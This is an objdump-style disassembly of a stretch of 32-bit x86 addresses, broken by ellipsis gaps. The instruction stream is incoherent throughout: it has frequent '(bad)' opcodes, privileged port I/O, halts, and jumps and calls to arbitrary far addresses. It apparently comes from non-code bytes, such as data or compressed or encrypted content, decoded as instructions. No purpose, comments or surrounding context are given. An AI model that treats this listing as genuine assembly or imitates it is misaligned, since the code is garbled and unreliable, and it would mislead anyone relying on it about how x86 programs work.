  421c39:	sub    al,0x48
  421c3b:	icebp  
  421c3c:	adc    edx,DWORD PTR [ebx+ebp*4]
  421c3f:	cmp    DWORD PTR [esi-0x7f],esi
  421c42:	or     bl,BYTE PTR [eax-0x11]
  421c45:	sbb    al,0x7
  421c47:	or     dl,BYTE PTR [eax+ebp*8]
  421c4a:	mov    ecx,0xb55c13fb
  421c4f:	paddusw mm6,QWORD PTR [ecx]
  421c52:	rcr    DWORD PTR [esi-0xc798931],1
  421c58:	dec    esi
  421c59:	dec    ebp
  421c5a:	mov    DWORD PTR [edi+0x4b],ebx
  421c5d:	cdq    
  421c5e:	sub    BYTE PTR [edx-0x38848488],dl
  421c64:	mov    ecx,0x51317e21
  421c69:	jg     0x421c40
  421c6b:	call   0x5ab49194
  421c70:	fist   WORD PTR [ebx+edi*8]
  421c73:	push   edx
  421c74:	dec    esp
  421c75:	jl     0x421c94
  421c77:	and    dh,0xbe
  421c7a:	xor    DWORD PTR [eax+0x2289e703],edx
  421c80:	jl     0x421c9b
  421c82:	rcr    edx,cl
  421c84:	je     0x421c86
  421c86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421c87:	in     eax,dx
  421c88:	cli    
  421c89:	jl     0x421c78
  421c8b:	push   cs
  421c8c:	out    dx,eax
  421c8d:	mov    esi,0xe3f09a8d
  421c92:	pop    ss
  421c93:	stc    
  421c94:	and    dl,BYTE PTR [ecx]
  421c96:	loope  0x421cb7
  421c98:	jl     0x421ca3
  421c9a:	inc    ecx
  421c9b:	mov    al,0xa7
  421c9d:	jmp    0xed100eac
  421ca2:	lods   al,BYTE PTR ds:[esi]
  421ca3:	ins    DWORD PTR es:[edi],dx
  421ca4:	adc    dl,BYTE PTR [ebx+0x726d6a9e]
  421caa:	call   0xc117f261
  421caf:	inc    ecx
  421cb0:	pop    edi
  421cb1:	mov    cl,0xe3
  421cb3:	rol    DWORD PTR ds:0xb109cdf5,0x8f
  421cba:	mov    bh,BYTE PTR [edi+esi*4-0x2aacbbd5]
  421cc1:	ret    0x0
	...
  421d34:	out    0x1e,eax
  421d36:	into   
  421d37:	push   0x9fe7f8ff
  421d3c:	cmp    al,0xf2
  421d3e:	sub    al,0x59
  421d40:	adc    BYTE PTR [ebp+0x6d],dl
  421d43:	xchg   DWORD PTR [eax],ebp
  421d45:	push   0x1
  421d47:	add    dh,dh
  421d49:	add    BYTE PTR [eax],al
  421d4b:	add    ah,bl
  421d4d:	scas   al,BYTE PTR es:[edi]
  421d4e:	sti    
  421d4f:	sub    al,0x48
  421d51:	aaa    
  421d52:	test   DWORD PTR [ebp-0x674514dc],0x730ce7d6
  421d5c:	and    DWORD PTR ds:0x19ae49b6,ebx
  421d62:	adc    al,0x5
  421d64:	stc    
  421d65:	xchg   ecx,eax
  421d66:	stos   BYTE PTR es:[edi],al
  421d67:	les    eax,FWORD PTR [edx]
  421d69:	sahf   
  421d6a:	xlat   BYTE PTR ds:[ebx]
  421d6b:	js     0x421d32
  421d6d:	pop    ebp
  421d6e:	popa   
  421d6f:	pop    ebp
  421d70:	stos   BYTE PTR es:[edi],al
  421d71:	push   ebp
  421d72:	mov    WORD PTR [ebx-0x188f270e],fs
  421d78:	sub    esp,DWORD PTR ds:0x84909661
  421d7e:	mov    ds:0x6ba5b238,al
  421d83:	or     al,0xbc
  421d85:	enter  0x2cb8,0x2a
  421d89:	shl    DWORD PTR [eax-0x2b78afd9],cl
  421d8f:	xor    DWORD PTR [esi],eax
  421d91:	or     ah,dh
  421d93:	jbe    0x421d1c
  421d95:	(bad)  
  421d96:	sbb    DWORD PTR [esp+ebp*8+0x5e984f99],ebp
  421d9d:	fcmovb st,st(5)
  421d9f:	sub    cl,BYTE PTR [eax-0x1a511aa8]
  421da5:	(bad)  
  421da6:	sbb    bh,ch
  421da8:	ins    BYTE PTR es:[edi],dx
  421da9:	popf   
  421daa:	dec    edx
  421dab:	sar    DWORD PTR ds:0x9288ea74,0x16
  421db2:	push   cs
  421db3:	pop    ebp
  421db4:	jno    0x421daa
  421db6:	inc    esi
  421db7:	lahf   
  421db8:	jge    0x421df0
  421dba:	shl    DWORD PTR [edi+0x7812a4d9],cl
  421dc0:	pop    edx
  421dc1:	or     cl,0x74
  421dc4:	je     0x421e1a
  421dc6:	jno    0x421e14
  421dc8:	sbb    dh,al
  421dca:	xchg   DWORD PTR [edx],esi
  421dcc:	adc    eax,0xda583c38
  421dd1:	hlt    
  421dd2:	scas   eax,DWORD PTR es:[edi]
  421dd3:	sbb    dh,0x22
  421dd6:	adc    eax,0xe1f2630
  421ddb:	loop   0x421e1d
  421ddd:	jb     0x421dfa
  421ddf:	mov    esp,0xb3175f96
  421de4:	test   esi,ebx
  421de6:	bound  edi,QWORD PTR [ebp-0x6d]
  421de9:	dec    esp
  421dea:	add    BYTE PTR [eax+0x4c],ch
  421ded:	rcl    BYTE PTR [ecx],0x46
  421df0:	xchg   ebp,eax
  421df1:	jns    0x421dd1
  421df3:	push   esi
  421df4:	mov    ebp,0x79ad01a3
  421df9:	or     ch,0x28
  421dfc:	xchg   DWORD PTR [esi-0x59],eax
  421dff:	jb     0x421dd8
  421e01:	xor    eax,0x489d1b57
  421e06:	sbb    eax,0xeb588040
  421e0b:	or     al,0xda
  421e0d:	test   BYTE PTR [ecx+0x471e68ce],bl
  421e13:	cdq    
  421e14:	ins    DWORD PTR es:[edi],dx
  421e15:	pop    esi
  421e16:	cs dec esi
  421e18:	jb     0x421e36
  421e1a:	jmp    FWORD PTR [eax]
  421e1c:	mov    bh,BYTE PTR [edx+0x5dff0b34]
  421e22:	or     al,0xf5
  421e24:	cmp    DWORD PTR [esi-0x5c],edi
  421e27:	in     al,dx
  421e28:	imul   al
  421e2a:	fldcw  WORD PTR [eax+esi*4-0x43631977]
  421e31:	sbb    ecx,DWORD PTR ds:[eax]
  421e34:	fcom   QWORD PTR [edi+ebx*8-0x30]
  421e38:	loopne 0x421e96
  421e3a:	push   ebx
  421e3b:	pop    ds
  421e3c:	push   ss
  421e3d:	mov    dh,0xd2
  421e3f:	in     eax,dx
  421e40:	inc    esp
  421e41:	dec    ebp
	...
  421eb2:	add    BYTE PTR [eax],al
  421eb4:	and    BYTE PTR [edi-0x28082cbe],dl
  421eba:	mov    cl,0xf7
  421ebc:	fisttp WORD PTR [ebx-0x19]
  421ebf:	jo     0x421ec8
  421ec1:	jecxz  0x421e45
  421ec3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421ec4:	push   ds
  421ec5:	imul   eax,DWORD PTR [ecx],0x0
  421ec8:	test   BYTE PTR [eax],0x0
  421ecb:	add    ah,ch
  421ecd:	mov    al,ds:0x41767cc2
  421ed2:	(bad)  
  421ed3:	test   esp,0xe53be61e
  421ed9:	lods   eax,DWORD PTR ds:[esi]
  421eda:	mov    ds:0x5a3b5c36,eax
  421edf:	call   0x95ad:0x5e3ff940
  421ee6:	xchg   BYTE PTR ds:0xbee37bf2,cl
  421eec:	push   esp
  421eed:	sar    BYTE PTR ds:0x641e707c,cl
  421ef3:	in     eax,0xa2
  421ef5:	and    edi,DWORD PTR [edi]
  421ef7:	aas    
  421ef8:	adc    ch,cl
  421efa:	outs   dx,BYTE PTR ds:[esi]
  421efb:	outs   dx,DWORD PTR ds:[esi]
  421efc:	imul   eax,eax,0xdf520250
  421f02:	cmp    eax,0xfb0000b2
  421f07:	ds ret 
  421f09:	daa    
  421f0a:	mov    ah,0x2c
  421f0c:	ret    0x39f5
  421f0f:	cmp    DWORD PTR [ebx],esi
  421f11:	adc    eax,DWORD PTR [ebp+0xa]
  421f14:	inc    DWORD PTR [edi+0x3e]
  421f17:	lods   eax,DWORD PTR ds:[esi]
  421f18:	sub    BYTE PTR [edx+0x5e],cl
  421f1b:	push   ecx
  421f1c:	lods   eax,DWORD PTR ds:[esi]
  421f1d:	pop    ss
  421f1e:	ins    BYTE PTR es:[edi],dx
  421f1f:	stc    
  421f20:	or     ah,BYTE PTR [ebx]
  421f22:	pop    edi
  421f23:	ror    DWORD PTR ds:0xe36ad189,0xc3
  421f2a:	ins    BYTE PTR es:[edi],dx
  421f2b:	out    0x36,eax
  421f2d:	(bad)  
  421f2e:	loopne 0x421f43
  421f30:	rcl    BYTE PTR [edi+0x62aad666],cl
  421f36:	xor    DWORD PTR [edi-0x5df4b6b5],ebx
  421f3c:	jp     0x421f3f
  421f3e:	mov    ecx,DWORD PTR ds:0x5322adab
  421f44:	jns    0x421f6e
  421f46:	fs lahf 
  421f48:	cdq    
  421f49:	out    dx,al
  421f4a:	cmp    al,0x5
  421f4c:	pop    esi
  421f4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421f4e:	or     al,BYTE PTR [edi]
  421f50:	hlt    
  421f51:	fs pushf 
  421f53:	push   edx
  421f54:	push   0xffffffff
  421f56:	dec    esi
  421f57:	call   0x1e64f3c0
  421f5c:	ja     0x421f86
  421f5e:	cmp    DWORD PTR [eax],ebp
  421f60:	inc    esp
  421f61:	add    DWORD PTR [esi-0x24],ebp
  421f64:	pop    ds
  421f65:	ja     0x421f31
  421f67:	jp     0x421f86
  421f69:	cli    
  421f6a:	push   edi
  421f6b:	lods   al,BYTE PTR ds:[esi]
  421f6c:	dec    esi
  421f6d:	sub    al,0x8c
  421f6f:	stc    
  421f70:	push   0x35b0d692
  421f75:	mov    bl,0x82
  421f77:	pop    edi
  421f78:	push   cs
  421f79:	out    dx,al
  421f7a:	(bad)  
  421f7b:	fstp   QWORD PTR [ecx]
  421f7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421f7e:	cmp    al,0x2
  421f80:	sti    
  421f81:	sub    al,0x7e
  421f83:	mov    dh,0xa9
  421f85:	into   
  421f86:	pop    ss
  421f87:	in     al,dx
  421f88:	pusha  
  421f89:	dec    DWORD PTR [ebx]
  421f8b:	inc    ecx
  421f8c:	ss ins DWORD PTR es:[edi],dx
  421f8e:	xchg   ebx,eax
  421f8f:	mov    cl,0xc
  421f91:	loope  0x421ffa
  421f93:	and    ah,bl
  421f95:	loop   0x421f7a
  421f97:	hlt    
  421f98:	aaa    
  421f99:	sbb    DWORD PTR [edx+0x55],esi
  421f9c:	cmp    ah,BYTE PTR [edx-0x9]
  421f9f:	mov    ch,0x38
  421fa1:	add    eax,DWORD PTR [esi+0x79]
  421fa4:	jbe    0x422012
  421fa6:	lea    edx,[ecx+ebx*2]
  421fa9:	push   cs
  421faa:	mov    edi,DWORD PTR [ebx-0x5d]
  421fad:	jp     0x421fe8
  421faf:	adc    BYTE PTR [ecx+0x4a01bafe],bh
  421fb5:	sub    ebx,DWORD PTR [ecx-0xf557887]
  421fbb:	dec    ebp
  421fbc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421fbd:	xchg   ch,bh
  421fbf:	cmp    ecx,edi
  421fc1:	mov    BYTE PTR [eax],0x0
	...
  422034:	lahf   
  422035:	pop    esi
  422036:	fcmovb st,st(6)
  422038:	fcmovnb st,st(6)
  42203a:	lahf   
  42203b:	pop    edi
  42203c:	bnd ja 0x422029
  42203f:	mov    edi,0xc43facd0
  422044:	adc    al,0x6c
  422046:	add    DWORD PTR [eax],eax
  422048:	test   BYTE PTR [eax],0x0
  42204b:	add    BYTE PTR [edi],bh
  42204d:	pop    ebp
  42204e:	mov    BYTE PTR [ebp+0x3ea59ed5],0x26
  422055:	pop    eax
  422056:	push   0xce535b4a
  42205b:	test   al,0x9f
  42205d:	and    al,0xb3
  42205f:	std    
  422060:	sti    
  422061:	cmp    eax,esi
  422063:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  422065:	(bad)  
  422066:	lods   al,BYTE PTR ds:[esi]
  422067:	scas   al,BYTE PTR es:[edi]
  422068:	mov    al,BYTE PTR [esi]
  42206a:	pusha  
  42206b:	inc    esp
  42206c:	in     al,dx
  42206d:	mov    eax,0xa5366d93
  422072:	dec    ebx
  422073:	(bad)  
  422074:	or     eax,esp
  422076:	sub    ch,dl
  422078:	nop
  422079:	pushf  
  42207a:	repnz pusha 
  42207c:	add    al,0x47
  42207e:	mov    ds:0x207fe8d2,eax
  422083:	pop    ecx
  422084:	mov    bl,0xeb
  422086:	mov    ecx,0x8e3593d1
  42208b:	sbb    edx,DWORD PTR [edx-0x45]
  42208e:	outs   dx,DWORD PTR ds:[esi]
  42208f:	mov    ecx,0x15f4c750
  422094:	cwde   
  422095:	dec    eax
  422096:	jne    0x4220bd
  422098:	mov    ch,0xe0
  42209a:	mov    ah,0x9
  42209c:	test   eax,0xd6ddd872
  4220a1:	scas   eax,DWORD PTR es:[edi]
  4220a2:	imul   eax,DWORD PTR [edx-0x5629dfee],0x940f1aa3
  4220ac:	test   DWORD PTR [ecx+0xf],ebp
  4220af:	fimul  DWORD PTR [edx+0x8848c41]
  4220b5:	xchg   esi,eax
  4220b6:	cmp    eax,0x3d4d11fe
  4220bb:	or     BYTE PTR [edi],ah
  4220bd:	sub    cl,BYTE PTR [esi-0x43]
  4220c0:	das    
  4220c1:	xor    edi,edi
  4220c3:	sbb    BYTE PTR [edi],bh
  4220c5:	xor    bl,BYTE PTR [ebx-0x51d7e1e]
  4220cb:	xor    eax,DWORD PTR [esi]
  4220cd:	jbe    0x4220c7
  4220cf:	or     esi,eax
  4220d1:	push   ss
  4220d2:	xchg   ecx,eax
  4220d3:	jbe    0x422073
  4220d5:	xchg   BYTE PTR [ebx+0x73d4889e],bh
  4220db:	aas    
  4220dc:	cdq    
  4220dd:	jns    0x4220b9
  4220df:	fstp   TBYTE PTR [ebp-0x51]
  4220e2:	adc    edi,DWORD PTR [eax-0x7d80ff13]
  4220e8:	(bad)  
  4220e9:	jns    0x4220ff
  4220eb:	out    0x25,eax
  4220ed:	fwait
  4220ee:	pop    ss
  4220ef:	imul   DWORD PTR [ebx]
  4220f1:	lds    ebx,FWORD PTR [ebx+0x19]
  4220f4:	inc    ebx
  4220f5:	pop    edx
  4220f6:	pop    eax
  4220f7:	sub    DWORD PTR [esi+0x3b],ebx
  4220fa:	pop    ss
  4220fb:	fsubr  QWORD PTR [ebx+0x6d61a308]
  422101:	jne    0x42211f
  422103:	push   0x5f
  422105:	aam    0x5f
  422107:	xlat   BYTE PTR ds:[ebx]
  422108:	jns    0x422127
  42210a:	aas    
  42210b:	mov    ebp,0x4aba388f
  422110:	inc    edx
  422111:	dec    ebp
  422112:	ret    
  422113:	mov    dh,0xff
  422115:	(bad)  
  422116:	adc    BYTE PTR ds:0x811a2052,dh
  42211c:	sub    eax,0x1fd2b383
  422121:	mov    ch,0x7c
  422123:	outs   dx,DWORD PTR ds:[esi]
  422124:	push   eax
  422125:	jo     0x42213f
  422127:	fxch   st(7)
  422129:	repz sub DWORD PTR [ecx-0x42f88d74],0xffffffc6
  422131:	pop    ds
  422132:	rcr    ch,cl
  422134:	clc    
  422135:	repnz xchg edi,eax
  422137:	pop    edx
  422138:	sbb    BYTE PTR [edi],bl
  42213a:	push   ebp
  42213b:	cwde   
  42213c:	(bad)  
  42213e:	cli    
  42213f:	adc    esp,DWORD PTR ds:0x94
	...
  4221b1:	add    BYTE PTR [eax],al
  4221b3:	add    BYTE PTR [esi-0x700870e1],bl
  4221b9:	idiv   esi
  4221bb:	jg     0x4221f8
  4221bd:	data16 daa 
  4221bf:	aad    0x3
  4221c1:	(bad)
  4221c5:	ins    DWORD PTR es:[edi],dx
  4221c6:	add    DWORD PTR [eax],eax
  4221c8:	test   BYTE PTR [eax],0x0
  4221cb:	add    BYTE PTR [edx],dh
  4221cd:	fldenv [eax-0x78]
  4221d0:	sbb    ah,BYTE PTR [esi]
  4221d2:	sbb    al,BYTE PTR [edi+0x5e]
  4221d5:	inc    esi
  4221d6:	(bad)  
  4221d7:	fcmovne st,st(6)
  4221d9:	push   ds
  4221da:	aam    0xed
  4221dc:	inc    ecx
  4221dd:	xchg   edi,eax
  4221de:	stos   BYTE PTR es:[edi],al
  4221df:	clc    
  4221e0:	clc    
  4221e1:	and    DWORD PTR [ebx+edx*1-0x61],ecx
  4221e5:	cwde   
  4221e6:	add    eax,0x7cf9827a
  4221eb:	mov    ah,0x75
  4221ed:	sub    ch,BYTE PTR [ecx+eiz*2]
  4221f0:	pop    edi
  4221f1:	popa   
  4221f2:	retf   0x5af3
  4221f5:	les    edx,FWORD PTR [eax]
  4221f7:	dec    ebp
  4221f8:	cmp    esi,DWORD PTR [eax+0x7beec31c]
  4221fe:	jae    0x4221b6
  422200:	fild   WORD PTR [ecx]
  422202:	clc    
  422203:	dec    esp
  422204:	or     al,0x46
  422206:	pop    ds
  422207:	ins    DWORD PTR es:[edi],dx
  422208:	push   edx
  422209:	sbb    al,0xb0
  42220b:	clc    
  42220c:	test   DWORD PTR [ecx+0x51],0x70edce2
  422213:	mov    al,ds:0xf7ab6738
  422218:	mov    bh,0x8f
  42221a:	(bad)  
  42221b:	mov    dl,0x52
  42221d:	(bad)  
  42221e:	repnz pop es
  422220:	push   es
  422221:	sbb    ah,BYTE PTR [ebp+0x6b]
  422224:	sbb    DWORD PTR [ebp+0x1b36400e],ebp
  42222a:	jae    0x42226a
  42222c:	lea    ebx,[eax+0x55]
  42222f:	in     al,dx
  422230:	ds into 
  422232:	push   0xffffffcc
  422234:	adc    eax,ebx
  422236:	xchg   esp,eax
  422237:	imul   BYTE PTR [edx+ecx*8+0x58434d00]
  42223e:	(bad)  
  42223f:	sar    DWORD PTR [edx+edx*1],1
  422242:	push   ecx
  422243:	scas   al,BYTE PTR es:[edi]
  422244:	retf   
  422245:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422246:	push   ss
  422247:	cmp    eax,0x8ebeede4
  42224c:	pop    ebx
  42224d:	xchg   ebx,eax
  42224e:	sub    bl,BYTE PTR [edx]
  422250:	pop    ebx
  422251:	jne    0x422286
  422253:	retf   
  422254:	in     al,dx
  422255:	pop    eax
  422256:	inc    edx
  422257:	mov    dh,BYTE PTR [eax+0x7f]
  42225a:	dec    edx
  42225b:	and    DWORD PTR [esi],0xffffff9b
  42225e:	lea    esi,[edx-0x6d]
  422261:	mov    BYTE PTR [ecx+0x7a],bl
  422264:	sar    BYTE PTR [ecx-0x2d15b11],0x3f
  42226b:	aad    0xcf
  42226d:	sub    dl,BYTE PTR fs:[ebp+0xb]
  422271:	pusha  
  422272:	mov    cl,0x54
  422274:	js     0x42224b
  422276:	repnz sahf 
  422278:	loopne 0x42228d
  42227a:	test   al,0x59
  42227c:	xchg   esp,eax
  42227d:	push   esp
  42227e:	aad    0xfb
  422280:	ret    0x68ff
  422283:	dec    edx
  422284:	mov    bh,0xf7
  422286:	out    dx,al
  422287:	ret    
  422288:	retf   
  422289:	sub    BYTE PTR [esi+eiz*8-0x524a6f1],al
  422290:	sub    eax,0xe2d7d599
  422295:	mov    esp,0xb99cdf1c
  42229a:	add    dh,bl
  42229c:	add    dl,ah
  42229e:	ins    BYTE PTR es:[edi],dx
  42229f:	jmp    0xc393009d
  4222a4:	lods   al,BYTE PTR ds:[esi]
  4222a5:	aas    
  4222a6:	xor    eax,0x3037fd44
  4222ab:	cld    
  4222ac:	mov    WORD PTR [esi-0x41],?
  4222af:	mov    dl,0xf2
  4222b1:	adc    DWORD PTR [esi],eax
  4222b3:	lods   eax,DWORD PTR ds:[esi]
  4222b4:	ror    DWORD PTR [eax],0x68
  4222b7:	and    bl,BYTE PTR [esi+0x7b28c868]
  4222bd:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  4222bf:	jmp    0x0:0x532a
	...
  422332:	add    BYTE PTR [eax],al
  422334:	inc    bh
  422336:	pop    esp
  422337:	mov    eax,ds:0xdfffbb7d
  42233c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42233d:	inc    edi
  42233e:	gs pop es
  422340:	pop    ss
  422341:	push   eax
  422342:	fidivr WORD PTR [ebp+0x0]
  422345:	outs   dx,BYTE PTR ds:[esi]
  422346:	add    DWORD PTR [eax],eax
  422348:	test   BYTE PTR [eax],0x0
  42234b:	add    BYTE PTR [eax+0x4d3b7b08],al
  422351:	fnsetpm(287 only) 
  422353:	jl     0x422331
  422355:	xor    al,0x79
  422357:	pop    ecx
  422358:	retf   
  422359:	push   es
  42235a:	push   cs
  42235b:	addr16 aas 
  42235d:	out    dx,al
  42235e:	imul   ecx,DWORD PTR [ecx],0x7b40ebc9
  422364:	xor    al,0x6d
  422366:	xchg   ecx,eax
  422367:	mov    bh,0xd6
  422369:	mov    eax,0x17c4c347
  42236e:	jno    0x422346
  422370:	or     DWORD PTR ds:0xc7a2f071,edi
  422376:	push   edx
  422377:	cmp    eax,0x7aec1f63
  42237c:	adc    al,0xd4
  42237e:	test   ch,ch
  422380:	shr    DWORD PTR [eax+ebp*4-0x5f],0xfa
  422385:	and    al,0xd2
  422387:	sbb    esp,DWORD PTR [esi-0x3fb9b68b]
  42238d:	push   edx
  42238e:	xor    edx,DWORD PTR [edx-0x12]
  422391:	mov    bl,0xc5
  422393:	xor    bh,BYTE PTR [ecx-0x642b3e0e]
  422399:	dec    esp
  42239a:	xor    BYTE PTR [eax-0x6b],al
  42239d:	in     al,dx
  42239e:	mov    ebp,0x58ef557e
  4223a3:	and    ah,BYTE PTR [eax+0x45917bb9]
  4223a9:	stos   BYTE PTR es:[edi],al
  4223aa:	scas   al,BYTE PTR es:[edi]
  4223ab:	aam    0xf3
  4223ad:	mov    eax,ds:0x760dcaec
  4223b2:	popa   
  4223b3:	adc    BYTE PTR [ebx+0x51403796],bl
  4223b9:	mov    al,0xbc
  4223bb:	cld    
  4223bc:	and    al,BYTE PTR [ebx-0x33]
  4223bf:	push   ebp
  4223c0:	xor    BYTE PTR [ecx+0x5f],cl
  4223c3:	std    
  4223c4:	es or  al,0x9e
  4223c7:	fcomp  QWORD PTR [ecx-0x63]
  4223ca:	arpl   cx,dx
  4223cc:	mov    WORD PTR [ebp-0x3b],fs
  4223cf:	mov    dl,BYTE PTR [edx]
  4223d1:	push   es
  4223d2:	cwde   
  4223d3:	jge    0x422419
  4223d5:	bound  ebp,QWORD PTR [ecx]
  4223d7:	jmp    0x7401fe15
  4223dc:	push   ebp
  4223dd:	jmp    0xb965:0x12a9059
  4223e4:	sbb    al,0x10
  4223e6:	(bad)  
  4223e7:	daa    
  4223e8:	mov    BYTE PTR [ebp+0x6af4d3be],ah
  4223ee:	repz popw es
  4223f1:	data16 sbb BYTE PTR [edi+ecx*2+0x3a],bh
  4223f6:	std    
  4223f7:	mov    ch,0xc5
  4223f9:	in     al,dx
  4223fa:	retf   
  4223fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223fc:	xchg   edx,eax
  4223fd:	add    BYTE PTR [eax],al
  4223ff:	xchg   ebx,ebp
  422401:	jmp    0x422421
  422403:	fsubr  DWORD PTR [eax+0x3cec4d0f]
  422409:	cmc    
  42240a:	cdq    
  42240b:	push   esi
  42240c:	ret    
  42240d:	lods   eax,DWORD PTR ds:[esi]
  42240e:	ret    
  42240f:	ret    
  422410:	lods   al,BYTE PTR ds:[esi]
  422411:	jb     0x4223de
  422413:	pushf  
  422414:	adc    DWORD PTR [eax+0x652099d6],ecx
  42241a:	out    0x62,al
  42241c:	dec    esi
  42241d:	cli    
  42241e:	stos   DWORD PTR es:[edi],eax
  42241f:	es ret 
  422421:	sbb    al,0x25
  422423:	loope  0x42249b
  422425:	aam    0xd9
  422427:	mov    edx,0x5652ee1c
  42242c:	jno    0x4223e7
  42242e:	out    dx,eax
  42242f:	or     esp,DWORD PTR [ebp+0x44]
  422432:	(bad)  
  422433:	pop    eax
  422434:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422435:	push   eax
  422436:	sahf   
  422437:	cmp    BYTE PTR ds:0x32123cc6,bl
  42243d:	pop    ebp
  42243e:	push   edx
  42243f:	lea    esp,[ebx+ebp*8+0x0]
	...
  4224b3:	add    dh,dl
  4224b5:	repnz test BYTE PTR [eax],bl
  4224b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224b9:	jle    0x422499
  4224bb:	(bad)  
  4224bc:	(bad)  
  4224bd:	mov    edx,0xbaa29f7c
  4224c2:	cmp    eax,0x16ef6d5
  4224c7:	add    dh,dh
  4224c9:	add    BYTE PTR [eax],al
  4224cb:	add    BYTE PTR [edi],al
  4224cd:	adc    BYTE PTR [ebx],bh
  4224cf:	test   BYTE PTR [edi],cl
  4224d1:	mov    ebx,0xe6c32fc7
  4224d6:	dec    ecx
  4224d7:	sub    eax,0xe77f04bc
  4224dc:	mov    ah,0x28
  4224de:	mov    ecx,0xd2e21d16
  4224e3:	cld    
  4224e4:	in     al,0xfd
  4224e6:	bnd jp 0x4224e4
  4224e9:	push   0xe7d4429f
  4224ee:	pop    edx
  4224ef:	je     0x42251f
  4224f1:	repnz or eax,0x9474c83a
  4224f7:	fist   DWORD PTR [ebp-0x2ad89ef2]
  4224fd:	mov    ch,dl
  4224ff:	mov    DWORD PTR [ebx+0x29e16dc9],esp
  422505:	(bad)  
  422506:	in     eax,0xdf
  422508:	bound  edi,QWORD PTR [edi+0x79]
  42250b:	mov    esi,0xb7fd4710
  422510:	and    al,0xc2
  422512:	sar    esp,1
  422514:	cli    
  422515:	fsin   
  422517:	js     0x4224d1
  422519:	bound  ebx,QWORD PTR [esi-0x71]
  42251c:	int    0x8a
  42251e:	adc    al,0x58
  422520:	pop    ebx
  422521:	out    0x2d,eax
  422523:	jnp    0x422558
  422525:	xor    bh,dh
  422527:	push   esp
  422528:	mov    es,edi
  42252a:	sahf   
  42252b:	lahf   
  42252c:	jne    0x422585
  42252e:	fadd   QWORD PTR [edx]
  422530:	std    
  422531:	dec    edx
  422532:	daa    
  422533:	stc    
  422534:	xchg   ebp,eax
  422535:	pop    ebx
  422536:	mov    ds:0x7c296303,eax
  42253b:	jg     0x4224c0
  42253d:	(bad)  
  42253f:	push   esp
  422540:	and    al,0x8b
  422542:	(bad)  
  422543:	xor    DWORD PTR [ebp-0x37],edi
  422546:	lods   al,BYTE PTR ds:[esi]
  422547:	(bad)  
  422548:	call   0xdf84:0x7c66b26d
  42254f:	adc    al,0x48
  422551:	popf   
  422552:	push   ebx
  422553:	sub    eax,0x3959b006
  422558:	add    al,BYTE PTR [edx-0x7a]
  42255b:	stc    
  42255c:	push   cs
  42255d:	ror    DWORD PTR [eax],cl
  42255f:	mov    dh,0xbe
  422561:	xor    ah,BYTE PTR [esi-0x1458f923]
  422567:	(bad)  
  422568:	repz popf 
  42256a:	push   ss
  42256b:	scas   eax,DWORD PTR es:[edi]
  42256c:	enter  0xef60,0x35
  422570:	push   ebx
  422571:	fwait
  422572:	xchg   ecx,eax
  422573:	ss ret 
  422575:	add    eax,0xf3ca6d73
  42257a:	fstp   DWORD PTR [edi-0x13]
  42257d:	fnsave [edx+0x5d019b53]
  422583:	fldcw  WORD PTR ds:0xe80404c1
  422589:	rcr    BYTE PTR [ecx],cl
  42258b:	mov    cl,0xbd
  42258d:	mov    al,ds:0xeb2c2476
  422592:	mov    esp,0xb39429bc
  422597:	mov    bh,0xf9
  422599:	pop    esi
  42259a:	sub    eax,0xe830d2e6
  42259f:	mov    dl,0x19
  4225a1:	push   cs
  4225a2:	pop    ebx
  4225a3:	aaa    
  4225a4:	sub    al,0xc7
  4225a6:	pop    ebx
  4225a7:	or     DWORD PTR [edx-0x2e],ecx
  4225aa:	call   0x6c62:0xa90b3e62
  4225b1:	icebp  
  4225b2:	and    DWORD PTR [esi-0x1df9e7a0],0x69
  4225b9:	adc    eax,0x92306c31
  4225be:	shl    DWORD PTR [edx],cl
  4225c0:	jbe    0x422639
	...
  422632:	add    BYTE PTR [eax],al
  422634:	stos   DWORD PTR es:[edi],eax
  422635:	sub    al,0xed
  422637:	stos   BYTE PTR es:[edi],al
  422638:	out    dx,eax
  422639:	jmp    0x42262a
  42263b:	sub    eax,0xb720f321
  422640:	xor    DWORD PTR [ecx+eiz*4+0x30],edi
  422644:	in     al,dx
  422645:	outs   dx,DWORD PTR ds:[esi]
  422646:	add    DWORD PTR [eax],eax
  422648:	test   BYTE PTR [eax],0x0
  42264b:	add    BYTE PTR [edi-0x7],ah
  42264e:	repnz and al,0xc6
  422651:	push   0xb01d731d
  422656:	loope  0x4225ec
  422658:	or     esi,DWORD PTR [ebx-0x4f]
  42265b:	lock ja 0x4226bc
  42265e:	fcmovu st,st(0)
  422660:	pushf  
  422661:	and    eax,0xe0a53f92
  422666:	jmp    0x4226db
  422668:	clc    
  422669:	or     al,0x5f
  42266b:	mov    BYTE PTR ds:0xc194bd85,ah
  422671:	jecxz  0x4226a2
  422673:	xor    DWORD PTR [eax+0x50],0x735e7907
  42267a:	aam    0xb3
  42267c:	sbb    BYTE PTR [ebx+0x6c],cl
  42267f:	fwait
  422680:	mov    al,0xf5
  422682:	or     BYTE PTR [edi-0x3c20d17e],ah
  422688:	nop
  422689:	fild   QWORD PTR [ecx]
  42268b:	mov    al,0x73
  42268d:	aaa    
  42268e:	test   al,0x53
  422690:	call   0x572636bd
  422695:	add    DWORD PTR [ebp+0x2a],esp
  422698:	das    
  422699:	xchg   esp,eax
  42269a:	sbb    al,0xfb
  42269c:	sti    
  42269d:	sub    dh,ch
  42269f:	mov    BYTE PTR [esi+0x5c],dl
  4226a2:	fwait
  4226a3:	icebp  
  4226a4:	stos   BYTE PTR es:[edi],al
  4226a5:	into   
  4226a6:	mov    ecx,0xb11da4da
  4226ab:	xor    DWORD PTR ds:0xbf7d8aaf,ebx
  4226b1:	sub    al,0x46
  4226b3:	xchg   BYTE PTR [ebx-0x14],dh
  4226b6:	aaa    
  4226b7:	sub    dl,0x7f
  4226ba:	mov    al,0x20
  4226bc:	into   
  4226bd:	push   es
  4226be:	jle    0x4226cf
